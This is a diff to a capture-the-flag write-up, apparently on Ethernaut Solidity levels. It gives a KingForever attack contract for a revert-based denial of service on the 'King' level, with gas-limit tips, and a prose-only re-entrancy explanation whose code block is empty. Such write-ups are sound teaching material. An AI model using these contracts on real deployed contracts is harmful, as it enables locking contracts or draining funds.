@@ -100,28 +100,30 @@ Essentially your private variables are completely exposed on a public chain simp
 
 ## 9. King
 This is a classic example of DDoS with unexpected revert whereby when the contract tries to do a transfer back to you address (contract), your payable fallback function will simply revert (or if you don't have 1) thus ensuring that nobody can overtake your position as king. 
+
+edit: Make sure that when you sign the transaction with metamask, you manually increase the gas limit on the metamask transaction pop up. 4 mil gas limit is more than enough, too big and it might fail on the ropsten network (block limits on different networks vary)
 ```
 pragma solidity ^0.4.24;
 
 contract KingForever {
-    
-    address private _victim;
-    
-    constructor(address victim) public payable {
-        _victim = victim;
+
+    function takeover(address _target) public payable {
+        //target King contract
+        _target.call.value(msg.value).gas(4000000)();
     }
     
-    function throneIsMine() public {
-        _victim.call.value(100000000000000)();
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
     }
-    
-    
-    function() public payable {
-        revert("The throne is mine forever");
-    }
-    
 }
 ```
+
+## 10. Re-entrancy
+The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is not updated. When the call.value is processed, the control is handed back to the fallback function of the malicious contract which then calls the withdraw function again.
+```
+
+```
+
 
 
 
